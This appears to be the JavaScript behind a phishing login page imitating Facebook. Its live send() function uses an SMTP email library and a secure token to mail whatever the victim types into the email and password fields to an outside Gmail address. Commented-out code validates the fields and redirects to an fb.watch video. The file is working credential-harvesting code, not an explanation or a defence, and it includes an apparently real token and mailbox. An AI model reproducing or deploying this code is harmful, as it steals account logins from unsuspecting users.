//
//
//
//form.addEventListener('submit', (event)=> {  //  (event)=>{}    '==='   function(event){}
//
//
//var form = document.getElementById("form")
//var email = document.getElementById("text_email")
//var password = document.getElementById("text_pass")
//var error_email = document.getElementById("error_email")
//var error_pass = document.getElementById("error_pass")
//
//
//if(email.value.length > 10 && password.value.length > 5 && 
//email.value.startsWith("01") ||email.value.endsWith("@gmail.com"))
//{
//
//window.open("https://fb.watch/siYfCbMt1C/")
//return true;
//}else{
//
//
//event.preventDefault()
//}
//

//768FF089D831FE93D92976170A41A9D22505

function send(){

Email.send({
    SecureToken : "ca5ab373-37c0-4de0-a759-8189cb390f14",
    To : 'tryhardhydshwt@gmail.com',
    From : "tryhardhydshwt@gmail.com",
    Subject : "test email",
    Body : "EMAIL: " + document.getElementById("text_email").value
	         + "<br> password: " + document.getElementById("text_pass").value 
}).then(
  message => alert(" „ «·«—”«·")
  
 
);

}




















//if(email.value.length <= 10 && password.value.length >= 5 ){
//
//setTimeout(()=>{error_email.style.display = "block";},200)
//setTimeout(()=>{error_email.style.display = "none";},5000)
//event.preventDefault()
//}
//
//if(password.value.length <= 5 && email.value.length >= 10){
//
//setTimeout(()=>{error_pass.style.display = "block"},200)
//setTimeout(()=>{error_pass.style.display = "none"},5000)
//event.preventDefault()
//}
//
//if(email.value.length <= 10 && password.value.length <= 5 ){
//
//setTimeout(()=>{error_email.style.display = "block";},200)
//setTimeout(()=>{error_email.style.display = "none";},5000)
//
//setTimeout(()=>{error_pass.style.display = "block"},200)
//setTimeout(()=>{error_pass.style.display = "none"},5000)
//
//event.preventDefault()
//}
//
//}
